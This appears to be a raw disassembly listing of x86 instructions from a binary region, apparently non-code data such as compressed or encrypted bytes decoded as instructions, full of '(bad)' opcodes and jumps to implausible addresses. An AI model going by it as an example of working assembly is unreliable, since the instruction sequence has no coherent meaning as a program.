  42129e:	pop    eax
  42129f:	xchg   ebp,eax
  4212a0:	add    BYTE PTR [edx-0x7501896],bl
  4212a6:	and    al,0xe7
  4212a8:	jmp    0x88361b5c
  4212ad:	scas   eax,DWORD PTR es:[edi]
  4212ae:	xchg   edx,eax
  4212af:	ss inc edx
  4212b1:	std    
  4212b2:	sti    
  4212b3:	jl     0x421317
  4212b5:	push   edi
  4212b6:	add    al,0xbb
  4212b8:	xor    DWORD PTR [bx+di-0x4aef],0xffffff9f
  4212be:	mov    bh,0x9
  4212c0:	outs   dx,BYTE PTR ds:[esi]
  4212c1:	pop    eax
  4212c2:	ss retf 0x9e2d
  4212c6:	stc    
  4212c7:	pusha  
  4212c8:	pop    edx
  4212c9:	push   0x7a
  4212cb:	inc    ecx
  4212cc:	jle    0x421278
  4212ce:	mov    al,ds:0x451460ec
  4212d3:	push   0xffffffec
  4212d5:	repnz pushf 
  4212d7:	jl     0x421344
  4212d9:	xor    BYTE PTR [edi+0x1fe6e43a],al
  4212df:	addr16 out dx,al
  4212e1:	rol    DWORD PTR [eax+0x51],1
  4212e4:	push   ecx
  4212e5:	pusha  
  4212e6:	push   0xd2c1afac
  4212eb:	and    ch,BYTE PTR [edi+0x692011a0]
  4212f1:	sbb    al,0xd0
  4212f3:	fst    DWORD PTR [ecx-0x35]
  4212f6:	fidiv  DWORD PTR [edx+0x16]
  4212f9:	stos   BYTE PTR es:[edi],al
  4212fa:	adc    ebp,DWORD PTR [esi]
  4212fc:	or     al,bh
  4212fe:	or     BYTE PTR [eax],dl
  421300:	cmp    al,0x86
  421302:	mov    bh,0x4
  421304:	adc    al,0xa9
  421306:	stc    
  421307:	pop    ss
  421308:	xor    eax,0x51deaea0
  42130d:	mov    edx,ecx
  42130f:	cmp    dh,BYTE PTR [ebx]
  421311:	popf   
  421312:	fcmovu st,st(3)
  421314:	dec    esi
  421315:	jp     0x4212b4
  421317:	stos   BYTE PTR es:[edi],al
  421318:	or     dh,BYTE PTR [edi]
  42131a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42131b:	pop    edx
  42131c:	pushf  
  42131d:	xchg   ecx,eax
  42131e:	sub    eax,0x5d170429
  421323:	or     al,0xaf
  421325:	es xor eax,0x48b25ecd
  42132b:	repz out 0x78,al
  42132e:	mov    eax,0x12fece3
  421333:	(bad)  
  421335:	mov    edi,0x4549bf93
  42133a:	xchg   edi,eax
  42133b:	add    DWORD PTR [eax-0x22483b90],0xed8b2b70
  421345:	int3   
  421346:	sbb    ecx,DWORD PTR [edi+0x73955e6d]
  42134c:	adc    al,BYTE PTR [esi+0x7a]
  42134f:	jmp    0x421389
  421351:	sbb    ch,BYTE PTR [eax-0x79]
  421354:	in     eax,0x70
  421356:	cmp    eax,0x72510fdc
  42135b:	pop    esi
  42135c:	aad    0x2f
  42135e:	adc    bh,BYTE PTR [ebx]
  421360:	(bad)  
  421361:	aaa    
  421362:	out    dx,al
  421363:	sub    DWORD PTR [edi-0x56919399],0x68ddc27f
  42136d:	jns    0x4213d9
  42136f:	xor    edi,DWORD PTR [ebp+0x407d8035]
  421375:	enter  0xa63c,0x69
  421379:	sub    BYTE PTR [esi],cl
  42137b:	push   0xffffff99
  42137d:	(bad)  
  42137e:	inc    eax
  421380:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421381:	imul   ebp,ebp,0x1b
  421384:	fsub   QWORD PTR [edi-0x37]
  421387:	ror    ebx,1
  421389:	rcr    BYTE PTR cs:[edi],0x62
  42138d:	and    esi,ecx
  42138f:	cmc    
	...
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x21d90b61]
  421402:	pop    es
  421403:	pop    ds
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	pop    edi
  42140d:	ret    0xcbba
  421410:	pop    edx
  421411:	jmp    0x4e88:0x24df5cc5
  421418:	jo     0x42144e
  42141a:	push   edi
  42141b:	sbb    ebx,edi
  42141d:	mov    ecx,DWORD PTR [edi-0x7d62ec5f]
  421423:	inc    ebx
  421424:	call   0xf480:0xc0c972f7
  42142b:	sub    DWORD PTR [esp+edi*4],0x7d09b8af
  421432:	sahf   
  421433:	jnp    0x4213ea
  421435:	xchg   edi,eax
  421436:	dec    edx
  421437:	or     BYTE PTR [edx-0x32b28d3d],0xc2
  42143e:	dec    ebx
  42143f:	jmp    DWORD PTR [edi]
  421441:	mov    ah,0x20
  421443:	mov    bh,0x2e
  421445:	xchg   esi,eax
  421446:	mov    al,ds:0x4e4c9df7
  42144b:	rol    DWORD PTR [esp+ebp*2-0x3debe679],0x4
  421453:	xchg   edx,eax
  421454:	or     eax,0x1c2edda0
  421459:	mov    edi,0x6aeb13c4
  42145e:	out    dx,al
  42145f:	inc    esp
  421460:	add    edx,DWORD PTR [esi+0x23]
  421463:	loopne 0x421435
  421465:	out    0xa5,al
  421467:	sbb    dl,BYTE PTR [ebx-0x2f]
  42146a:	mov    BYTE PTR [ecx],dl
  42146c:	stos   DWORD PTR es:[edi],eax
  42146d:	xchg   ecx,eax
  42146e:	sbb    ecx,edi
  421470:	dec    esi
  421471:	mov    dh,BYTE PTR [ebp+0x56]
  421474:	mov    ?,edx
  421476:	push   esi
  421477:	adc    al,BYTE PTR [edx+0x6a]
  42147a:	shr    ebp,cl
  42147c:	adc    esi,DWORD PTR ds:0x4c9c8bd1
  421482:	mul    DWORD PTR [ebx]
  421484:	shl    DWORD PTR [ebx+eax*4],0x53
  421488:	sub    dl,BYTE PTR [edi+0x21fed1ef]
  42148e:	xchg   ebx,eax
  42148f:	dec    edi
  421490:	mov    ds:0xef78a835,eax
  421495:	lds    ebx,FWORD PTR [ebx]
  421497:	lahf   
  421498:	push   ss
  421499:	outs   dx,BYTE PTR ds:[esi]
  42149a:	xchg   edx,eax
  42149b:	dec    eax
  42149c:	inc    ecx
  42149d:	and    DWORD PTR ds:0xfcbf1259,esp
  4214a3:	pushf  
  4214a4:	sbb    ebp,DWORD PTR [esi-0x43]
  4214a7:	in     eax,dx
  4214a8:	jo     0x4214e4
  4214aa:	pop    ds
  4214ab:	movnti DWORD PTR [edi+0x4202ba87],esp
  4214b2:	leave  
  4214b3:	gs mov ah,0x2a
  4214b6:	mov    dl,0x65
  4214b8:	push   0xe3b2cbc0
  4214bd:	sbb    cl,0xd1
  4214c0:	mov    BYTE PTR [eax+0x22],dl
  4214c3:	into   
  4214c4:	and    BYTE PTR [edx-0x20],0x64
  4214c8:	stc    
  4214c9:	push   esp
  4214ca:	aaa    
  4214cb:	jp     0x421458
  4214cd:	ss jne 0x421511
  4214d0:	sbb    bl,0x94
  4214d3:	add    BYTE PTR [eax-0x4f9dc514],al
  4214d9:	test   DWORD PTR [edi-0x3b83e1b7],edx
  4214df:	shr    BYTE PTR [edx+0x68],1
  4214e2:	mov    ds:0x25f6a065,eax
  4214e7:	pop    edi
  4214e8:	adc    eax,DWORD PTR [ebx-0x47]
  4214eb:	jmp    0x4214e2
  4214ed:	jg     0x4214cd
  4214ef:	test   al,0x34
  4214f1:	rol    DWORD PTR ds:0x39cf2db2,cl
  4214f7:	xchg   ecx,eax
  4214f8:	xchg   ecx,eax
  4214f9:	(bad)  [ebx]
  4214fb:	addr16 gs out dx,al
  4214fe:	xchg   ebp,eax
  4214ff:	xchg   ebx,eax
  421500:	fs repnz xchg bh,dh
  421504:	mov    cl,0x40
  421506:	pop    esi
  421507:	rcr    DWORD PTR [ecx+0x28aebcb5],cl
  42150d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42150e:	shr    DWORD PTR [esi+0x0],0x0
	...
  421572:	add    BYTE PTR [eax],al
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x65e842b4],bp
  421582:	mov    ds:0x16318c6,eax
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	adc    ch,BYTE PTR [edi+edx*1+0x7c51a6ac]
  421593:	mov    ds:0xe5ed41c6,al
  421598:	fdivr  DWORD PTR [edx-0x3b7dbab3]
  42159e:	ret    0xb4f0
  4215a1:	add    BYTE PTR ds:0x7a0083c,cl
  4215a7:	pop    edi
  4215a8:	cmp    BYTE PTR [esi+0x4c3765c],al
  4215ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215af:	int    0x25
  4215b1:	jp     0x4215e2
  4215b3:	pusha  
  4215b4:	ds jne 0x4215df
  4215b7:	into   
  4215b8:	and    cl,bh
  4215ba:	lds    ecx,FWORD PTR [edi]
  4215bc:	js     0x4215de
  4215be:	pop    edx
  4215bf:	ret    
  4215c0:	shl    DWORD PTR [edx+edi*8],cl
  4215c3:	addr16 push cs
  4215c5:	clc    
  4215c6:	cli    
  4215c7:	sbb    edx,DWORD PTR [edi-0x30]
  4215ca:	cld    
  4215cb:	outs   dx,BYTE PTR ds:[esi]
  4215cc:	and    eax,0x1533d881
  4215d1:	mov    ebp,0x8331b9b
  4215d6:	(bad)  
  4215d7:	inc    esi
  4215d8:	aad    0xe7
  4215da:	jg     0x4215ce
  4215dc:	adc    DWORD PTR [edx+ebp*1],ebx
  4215df:	adc    al,0x30
  4215e1:	int    0xe9
  4215e3:	mov    eax,ds:0x4eb995cb
  4215e8:	pop    ecx
  4215e9:	(bad)  
  4215ea:	gs leave 
  4215ec:	(bad)  
  4215ed:	or     esi,esi
  4215ef:	mov    ds:0x42cbb4b7,eax
  4215f4:	test   al,0x23
  4215f6:	in     al,0x43
  4215f8:	inc    eax
  4215f9:	jne    0x421580
  4215fb:	aas    
  4215fc:	cld    
  4215fd:	cs sub al,0x2c
  421600:	call   0x3f533fb0
  421605:	cmp    DWORD PTR [ebp+esi*4-0x1b],esp
  421609:	sahf   
  42160a:	mov    al,0xdd
  42160c:	in     eax,0x9b
  42160e:	fbstp  TBYTE PTR [edi-0x1cc18b4d]
  421614:	adc    DWORD PTR [eax+0x9],esi
  421617:	mov    al,0x4f
  421619:	mov    esi,eax
  42161b:	cmp    ah,BYTE PTR [ebp+0x57874e8c]
  421621:	push   esi
  421622:	rol    BYTE PTR [esi],cl
  421624:	int3   
  421625:	sub    eax,0x7ba57796
  42162a:	jmp    0x6465:0x9e6e0700
  421631:	and    eax,DWORD PTR [ebx+0x5ce48f5]
  421637:	imul   eax,DWORD PTR [edx-0x34],0xffffffc0
  42163b:	add    al,0x11
  42163d:	js     0x421606
  42163f:	sub    ecx,ecx
  421641:	dec    edx
  421642:	shl    DWORD PTR [edx+0x21],0x3d
  421646:	stos   BYTE PTR es:[edi],al
  421647:	push   edi
  421648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421649:	sbb    al,0xbd
  42164b:	mov    esp,DWORD PTR [ecx+0xab82381]
  421651:	int3   
  421652:	pop    ss
  421653:	outs   dx,DWORD PTR ds:[esi]
  421654:	mov    bx,es
  421657:	test   BYTE PTR [edi+0x2b7dabb3],bh
  42165d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42165e:	jo     0x4216d8
  421660:	test   al,0x75
  421662:	dec    esp
  421663:	dec    eax
  421664:	nop
  421665:	in     al,dx
  421666:	sub    BYTE PTR [ecx-0x4ac53992],bh
  42166c:	(bad)  
  42166d:	repz data16 loopne 0x421676
  421671:	je     0x421688
  421673:	inc    esi
  421674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421675:	jle    0x421630
  421677:	dec    ebp
  421678:	ins    BYTE PTR es:[edi],dx
  421679:	sbb    al,BYTE PTR [edi+ebp*4-0x6defdb87]
  421680:	pop    ecx
  421681:	test   eax,0xbb09975e
  421686:	mov    edx,0x500f2727
  42168b:	sbb    DWORD PTR [ecx],ebp
  42168d:	jge    0x421653
  42168f:	adc    al,0x0
	...
  4216f1:	add    BYTE PTR [eax],al
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	fdivp  st(7),st
  421702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421703:	inc    edi
  421704:	sbb    al,0x64
  421706:	add    DWORD PTR [eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	mov    esi,0x87f393f9
  421711:	add    esi,DWORD PTR [ecx]
  421713:	cmp    BYTE PTR [ebx+ecx*8-0x793bf15e],dh
  42171a:	add    al,0x2b
  42171c:	sub    DWORD PTR [esi-0x75],ebx
  42171f:	mov    ebp,0xc4409bbd
  421724:	push   edx
  421725:	xor    al,0x3b
  421727:	out    dx,eax
  421728:	mov    DWORD PTR [ecx],ecx
  42172a:	cmp    BYTE PTR [esi+0x6576eb33],0xb4
  421731:	sbb    esi,esp
  421733:	xlat   BYTE PTR ds:[ebx]
  421734:	mov    bl,0x5d
  421736:	test   DWORD PTR [edx+0x19],ebx
  421739:	sti    
  42173a:	ja     0x421707
  42173c:	pushf  
  42173d:	mov    cl,0xcc
  42173f:	mov    cl,BYTE PTR [ebp+0x3d]
  421742:	cmp    al,0x69
  421744:	xor    al,0x8c
  421746:	loopne 0x421786
  421748:	ja     0x4216e2
  42174a:	xor    BYTE PTR [edi+0x6aee7bb7],ah
  421750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421751:	in     al,0xab
  421753:	or     eax,DWORD PTR [edi-0x2b]
  421756:	cmp    DWORD PTR [ecx],edx
  421758:	mov    eax,edx
  42175a:	ret    
  42175b:	imul   eax,DWORD PTR [ebp-0x40],0xc77f6e99
  421762:	jle    0x421785
  421764:	jp     0x4217b7
  421766:	jne    0x421792
  421768:	xor    DWORD PTR [ebp-0x9],ebp
  42176b:	xor    esi,DWORD PTR [ebp-0x1a2274a9]
  421771:	add    BYTE PTR [esi+0x75ef440e],ch
  421777:	jge    0x421751
  421779:	xchg   ebp,eax
  42177a:	cmp    al,0xf8
  42177c:	or     esp,DWORD PTR [ebx-0x4d]
  42177f:	mov    ebx,0x4889986d
  421784:	fwait
  421785:	and    edx,ecx
  421787:	ss xchg edi,eax
  421789:	aas    
  42178a:	out    0x69,ax
  42178d:	popa   
  42178e:	(bad)  
  42178f:	pop    ebp
  421790:	xchg   ecx,eax
  421791:	push   edi
  421792:	adc    al,0x27
  421794:	outs   dx,DWORD PTR ds:[esi]
  421795:	jbe    0x421760
  421797:	fsubr  QWORD PTR [eax-0x3bcb51fe]
  42179d:	xchg   edx,eax
  42179e:	fdivrp st(3),st
  4217a0:	jmp    0xfca6:0x96b85852
  4217a7:	dec    ecx
  4217a8:	test   BYTE PTR [ecx+0x1a],bl
  4217ab:	jge    0x421760
  4217ad:	cmp    ecx,esp
  4217af:	sub    esi,DWORD PTR [eax]
  4217b1:	sub    ch,BYTE PTR [eax]
  4217b3:	sti    
  4217b4:	inc    ecx
  4217b5:	es xchg esp,eax
  4217b7:	iret   
  4217b8:	repz out dx,al
  4217ba:	call   0x7949:0xe4a7109f
  4217c1:	mov    bh,0xb3
  4217c3:	xor    al,0x5e
  4217c5:	cld    
  4217c6:	ret    0xa194
  4217c9:	out    dx,eax
  4217ca:	mov    ebx,0x6cb2e0b0
  4217cf:	in     eax,0x18
  4217d1:	push   edi
  4217d2:	mov    edx,0x2f988c15
  4217d7:	cwde   
  4217d8:	xchg   ebx,eax
  4217d9:	fcmovu st,st(4)
  4217db:	cmp    ecx,0xffffffdb
  4217de:	jecxz  0x421815
  4217e0:	dec    esp
  4217e1:	push   DWORD PTR [esi]
  4217e3:	push   esp
  4217e4:	out    dx,al
  4217e5:	jnp    0x4217fc
  4217e7:	fstp   QWORD PTR [esi-0x26]
  4217ea:	fstp   TBYTE PTR [esi-0x5e]
  4217ed:	mov    ch,0x54
  4217ef:	test   eax,0x30c17102
  4217f4:	push   ds
  4217f5:	(bad)  
  4217f6:	(bad)  
  4217f7:	bound  esp,QWORD PTR [ebx-0x7a]
  4217fa:	cmp    DWORD PTR [ebx-0x42],edx
  4217fd:	pop    es
  4217fe:	stos   DWORD PTR es:[edi],eax
  4217ff:	or     esp,DWORD PTR [eax+0x2692aaa]
  421805:	fdivp  st(6),st
  421807:	pop    ecx
  421808:	xchg   ebp,eax
  421809:	jns    0x421867
  42180b:	sub    bl,ah
  42180d:	les    eax,FWORD PTR [eax-0x79]
	...
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	sub    BYTE PTR [ebp+0x6],0xf9
  421884:	and    BYTE PTR [ebp+0x1],ah
  421887:	add    BYTE PTR [ecx+eax*1],al
  42188a:	add    BYTE PTR [eax],al
  42188c:	jae    0x4218ef
  42188e:	mov    ch,0x9c
  421890:	sbb    BYTE PTR [esi-0x66d2ead4],al
  421896:	push   0xffffffbe
  421898:	(bad)  
  421899:	or     eax,edx
  42189b:	mov    edx,0x9228cf6f
  4218a0:	jbe    0x42190f
  4218a2:	inc    ecx
  4218a3:	scas   eax,DWORD PTR es:[edi]
  4218a4:	loop   0x42191a
  4218a6:	imul   ebx,DWORD PTR [esp+esi*8],0x67
  4218aa:	jecxz  0x421843
  4218ac:	mov    edx,0xf3f1d8e1
  4218b1:	lds    ecx,FWORD PTR ds:0x7d554095
  4218b7:	fisub  DWORD PTR [edi+0x13]
  4218ba:	mov    bh,0x88
  4218bc:	push   esi
  4218bd:	jg     0x421917
  4218bf:	lods   eax,DWORD PTR ds:[esi]
  4218c0:	arpl   WORD PTR [ecx-0x2a],di
  4218c3:	jbe    0x421877
  4218c5:	leave  
  4218c6:	xor    ebp,DWORD PTR [edx+0x46]
  4218c9:	jmp    0x421872
  4218cb:	(bad)  
  4218cd:	mov    ds:0x2cd2eaf,eax
  4218d2:	imul   ebp,DWORD PTR [esp+eax*2+0x5b],0x9a68ea13
  4218da:	sub    bl,BYTE PTR [edi]
  4218dc:	dec    esp
  4218dd:	out    dx,al
  4218de:	inc    esp
  4218df:	lock hlt 
  4218e1:	mov    cl,0xb7
  4218e3:	cmp    esi,DWORD PTR ds:0x17c0f07e
  4218e9:	imul   DWORD PTR [eax+0x22]
  4218ec:	ins    DWORD PTR es:[edi],dx
  4218ed:	pop    eax
  4218ee:	jnp    0x4218b5
  4218f0:	add    bh,BYTE PTR [esi+0x66707d96]
  4218f6:	int    0xa9
  4218f8:	pop    eax
  4218f9:	fnstcw WORD PTR [eax+0x41]
  4218fc:	mov    eax,ds:0x6309283
  421901:	cwde   
  421902:	sbb    esi,DWORD PTR [eax+0x6]
  421905:	or     BYTE PTR [esi+ebx*2+0x2e78098a],ch
  42190c:	retf   
  42190d:	mov    bl,0xe8
  42190f:	data16 xor BYTE PTR [ebp+0x295930c6],dh
  421916:	(bad)  
  421917:	outs   dx,DWORD PTR ds:[esi]
  421918:	jmp    0x17baa661
  42191d:	and    al,dl
  42191f:	call   0x3f355447
  421924:	mul    DWORD PTR [edx-0x2b]
  421927:	out    dx,eax
  421928:	pop    ss
  421929:	push   cs
  42192a:	arpl   WORD PTR [edx-0x67],dx
  42192d:	cmp    DWORD PTR [eax+0xe92f77e],ebx
  421933:	ficom  WORD PTR [ebx-0x754a270]
  421939:	push   0x7e
  42193b:	enter  0x49e6,0xd1
  42193f:	mov    WORD PTR [ebx+0x7c],fs
  421942:	inc    ecx
  421943:	mov    ecx,0x82ce8254
  421948:	pop    ebp
  421949:	adc    eax,0x8271a3a3
  42194e:	dec    edx
  42194f:	fdiv   st,st(7)
  421951:	and    eax,0x24fdb332
  421956:	jb     0x4218fc
  421958:	inc    eax
  421959:	(bad)  
  42195a:	push   edx
  42195b:	fcomp  st(0)
  42195d:	dec    ebp
  42195e:	cmc    
  42195f:	imul   esi,ebx,0x5f6025d4
  421965:	pushf  
  421966:	add    ebx,DWORD PTR ds:0x1436375f
  42196c:	lock inc ecx
  42196e:	loope  0x4219c3
  421970:	push   0x2b
  421972:	mov    eax,0x5fd97b61
  421977:	push   edi
  421978:	inc    edx
  421979:	xchg   edi,eax
  42197a:	shl    DWORD PTR [esi+0x35],cl
  42197d:	and    ah,BYTE PTR [esi]
  42197f:	sbb    edi,esi
  421981:	sub    BYTE PTR [edx+ebp*8],dh
  421984:	jle    0x421945
  421986:	jae    0x42193e
  421988:	pop    ebp
  421989:	stos   BYTE PTR es:[edi],al
  42198a:	cmp    esp,DWORD PTR [esi+0x55]
  42198d:	cmc    
  42198e:	sahf   
  42198f:	call   0x0:0x0
	...
  4219f2:	add    BYTE PTR [eax],al
  4219f4:	(bad)  
  4219f5:	cld    
  4219f6:	je     0x421a15
  4219f8:	jbe    0x421997
  4219fa:	(bad)  
  4219fb:	(bad)  
  4219fc:	jns    0x4219ee
  4219fe:	sbb    al,0x7b
  421a00:	push   ds
  421a01:	icebp  
  421a02:	mov    eax,ds:0x166247c
  421a07:	add    BYTE PTR [ecx+eax*1],al
  421a0a:	add    BYTE PTR [eax],al
  421a0c:	mov    ecx,0xe8977395
  421a11:	ret    0x95fa
  421a14:	push   ebp
  421a15:	ror    BYTE PTR [edi+ebx*1+0x44],1
  421a19:	leave  
  421a1a:	xchg   BYTE PTR [edi-0x433807ef],al
  421a20:	pop    ebp
  421a21:	push   edi
  421a22:	fld    QWORD PTR cs:[ecx+0x3856627b]
  421a29:	mov    BYTE PTR [ecx],dl
  421a2b:	xor    DWORD PTR [ebx],ebp
  421a2d:	fstp   QWORD PTR ds:0xfef238f5
  421a33:	or     dh,BYTE PTR [edi-0x47]
  421a36:	cli    
  421a37:	push   ecx
  421a38:	dec    edi
  421a39:	scas   al,BYTE PTR es:[edi]
  421a3a:	mov    cs,WORD PTR [edi+0x75]
  421a3d:	test   al,0xb5
  421a3f:	jle    0x421a8a
  421a41:	rcl    DWORD PTR [edi+0x21],cl
  421a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a45:	jnp    0x421a6c
  421a47:	ins    BYTE PTR es:[edi],dx
  421a48:	loope  0x421a36
  421a4a:	mov    ecx,0x49087960
  421a4f:	mov    ds:0xd6c5d3e9,al
  421a54:	xchg   ecx,eax
  421a55:	fsub   QWORD PTR [edi-0x14f319b2]
  421a5b:	out    dx,eax
  421a5c:	mov    bh,0x2e
  421a5e:	jl     0x421a41
  421a60:	mov    al,ds:0x660e27d
  421a65:	rcr    DWORD PTR [esi+0x3c],cl
  421a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a69:	jns    0x421acf
  421a6b:	dec    ebp
  421a6c:	mov    esp,0x72244d6d
  421a71:	call   0x3767:0xc2852dcb
  421a78:	cmp    dl,BYTE PTR [ebx+0xc]
  421a7b:	in     al,0x2c
  421a7d:	push   0x2fcaee66
  421a82:	sar    BYTE PTR [edi],cl
  421a84:	std    
  421a85:	bnd ret 
  421a87:	(bad)  
  421a88:	ror    BYTE PTR [ebx-0x1cbd9e64],0xb0
  421a8f:	sbb    ebx,DWORD PTR [ecx-0x54]
  421a92:	out    dx,al
  421a93:	imul   ebp,DWORD PTR [ecx-0x52],0xacab0e61
  421a9a:	sbb    eax,0xdf960b4d
  421a9f:	push   ebx
  421aa0:	pop    edx
  421aa1:	cmp    esi,ecx
  421aa3:	adc    eax,DWORD PTR [edx+0x50]
  421aa6:	xchg   cl,ah
  421aa8:	add    BYTE PTR [edx-0x413eb216],dl
  421aae:	push   ss
  421aaf:	inc    eax
  421ab0:	sub    esp,0xf
  421ab3:	dec    eax
  421ab4:	xchg   BYTE PTR [eax+ebp*1],cl
  421ab7:	xchg   ebp,eax
  421ab8:	ins    DWORD PTR es:[edi],dx
  421ab9:	mov    esp,0xcdff73ee
  421abe:	jo     0x421aae
  421ac0:	add    al,0x7
  421ac2:	jb     0x421ac4
  421ac4:	ins    BYTE PTR es:[edi],dx
  421ac5:	and    BYTE PTR [ebx+0x4fe371ee],bl
  421acb:	mov    dh,0x1d
  421acd:	ins    DWORD PTR es:[edi],dx
  421ace:	add    esi,ebx
  421ad0:	(bad)  
  421ad1:	js     0x421a93
  421ad3:	adc    ch,BYTE PTR [ecx]
  421ad5:	sub    DWORD PTR [eax],esp
  421ad7:	sub    esp,ecx
  421ad9:	mov    gs,WORD PTR [ebp-0x2d641717]
  421adf:	fist   WORD PTR [eax-0x19]
  421ae2:	sub    ebp,DWORD PTR [edi+ebp*4-0x78]
  421ae6:	fwait
  421ae7:	dec    ecx
  421ae8:	pop    ecx
  421ae9:	or     cl,al
  421aeb:	jno    0x421b57
  421aed:	mov    ecx,0x523be0ea
  421af2:	xor    eax,eax
  421af4:	mov    dh,0x29
  421af6:	adc    ebp,DWORD PTR [edi+0x33]
  421af9:	jnp    0x421ac0
  421afb:	out    dx,eax
  421afc:	int3   
  421afd:	je     0x421aae
  421aff:	ins    DWORD PTR es:[edi],dx
  421b00:	xchg   ebp,eax
  421b01:	aam    0x9
  421b03:	push   ebp
  421b04:	inc    ebx
  421b05:	sub    ah,BYTE PTR [esi]
  421b07:	adc    DWORD PTR [ebx+0x4203cbbc],esi
  421b0d:	es add esi,ebx
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     al,BYTE PTR [ebx+0x28f888ce]
  421b85:	add    DWORD PTR [bx+si],eax
  421b88:	add    al,0x1
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	sbb    edi,DWORD PTR [edi+0x7eb11717]
  421b92:	dec    ecx
  421b93:	and    DWORD PTR [edi-0x50],edi
  421b96:	(bad)  
  421b97:	outs   dx,BYTE PTR ds:[esi]
  421b98:	pushf  
  421b99:	cmp    DWORD PTR [ecx],0x2c
  421b9c:	jae    0x421b33
  421b9e:	leave  
  421b9f:	xor    eax,0xdd903221
  421ba4:	jb     0x421b9a
  421ba6:	retf   
  421ba7:	adc    DWORD PTR [esi-0x2b1638d3],ecx
  421bad:	repnz popa 
  421baf:	push   eax
  421bb0:	push   es
  421bb1:	pop    ebx
  421bb2:	inc    edi
  421bb3:	ins    DWORD PTR es:[edi],dx
  421bb4:	and    dh,cl
  421bb6:	add    DWORD PTR [ecx],ebp
  421bb8:	push   esp
  421bb9:	lock inc ebp
  421bbb:	mov    dl,0x46
  421bbd:	jo     0x421c16
  421bbf:	push   0x33
  421bc1:	jb     0x421c01
  421bc3:	sub    al,0x1c
  421bc5:	sub    DWORD PTR [edi+eiz*8-0x4150f613],esi
  421bcc:	adc    DWORD PTR [ebx+0x4e6088f6],0x4aca20a5
  421bd6:	stos   BYTE PTR es:[edi],al
  421bd7:	dec    edi
  421bd8:	mov    ds:0x3f2fa66,al
  421bdd:	dec    ebx
  421bde:	(bad)  
  421be0:	pop    ebp
  421be1:	dec    esi
  421be2:	push   es
  421be3:	(bad)  
  421be4:	push   ebp
  421be5:	popf   
  421be6:	or     ecx,DWORD PTR [edx+edi*8-0x7f]
  421bea:	ds cwde 
  421bec:	ror    BYTE PTR [eax-0xd],1
  421bef:	pop    ds
  421bf0:	in     al,0xd7
  421bf2:	(bad)  ds:0xd83494bb
  421bf8:	mov    ebp,0x5bd2e196
  421bfd:	adc    edi,DWORD PTR [eax-0x4dbc73e8]
  421c03:	cmp    al,0x4a
  421c05:	adc    eax,0x6a00c589
  421c0a:	addr16 je 0x421c1a
  421c0d:	and    eax,0xbacf9d96
  421c12:	mov    ds:0xfad5851d,al
  421c17:	mov    ebx,fs
  421c19:	jne    0x421c04
  421c1b:	jge    0x421c3c
  421c1d:	inc    esp
  421c1e:	push   edi
  421c1f:	mov    ah,0x8f
  421c21:	test   eax,0x9f96d873
  421c26:	in     al,0x11
  421c28:	push   esi
  421c29:	test   BYTE PTR [ecx],dh
  421c2b:	addr16 pusha 
  421c2d:	cdq    
  421c2e:	(bad)  
  421c2f:	leave  
  421c30:	(bad)  
  421c31:	and    BYTE PTR [eax],bh
  421c33:	frstor [eax-0x57]
  421c36:	mov    edx,0x55a4db53
  421c3b:	mov    dh,BYTE PTR [ebx-0x507773e6]
  421c41:	mov    dl,0xfc
  421c43:	mov    dl,0x1b
  421c45:	sub    esi,esp
  421c47:	xor    eax,eax
  421c49:	inc    eax
  421c4a:	stos   BYTE PTR es:[edi],al
  421c4b:	push   ebx
  421c4c:	add    esp,ecx
  421c4e:	sub    DWORD PTR [esi-0x43a501cf],eax
  421c54:	rcr    ch,1
  421c56:	mov    cx,0x5461
  421c5a:	leave  
  421c5b:	jae    0x421c42
  421c5d:	iret   
  421c5e:	in     al,dx
  421c5f:	mov    esi,0x411b29a6
  421c64:	adc    DWORD PTR [ebx],esp
  421c66:	jecxz  0x421c3a
  421c68:	jo     0x421c3c
  421c6a:	xchg   BYTE PTR [edx-0x3a],ah
  421c6d:	or     ch,bh
  421c6f:	les    esi,FWORD PTR [edx]
  421c71:	push   0xac20be17
  421c76:	jg     0x421c7b
  421c78:	call   0xa2583c97
  421c7d:	mov    ds:0x38a9d2b,al
  421c82:	xchg   edx,eax
  421c83:	int3   
  421c84:	stos   DWORD PTR es:[edi],eax
  421c85:	or     eax,0xa1c3865d
  421c8a:	jmp    0x421c98
  421c8c:	sub    al,0xf9
  421c8e:	pusha  
  421c8f:	mov    eax,0x0
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	stos   DWORD PTR es:[edi],eax
  421d01:	cwde   
  421d02:	xor    edx,ebp
  421d04:	sub    al,0x68
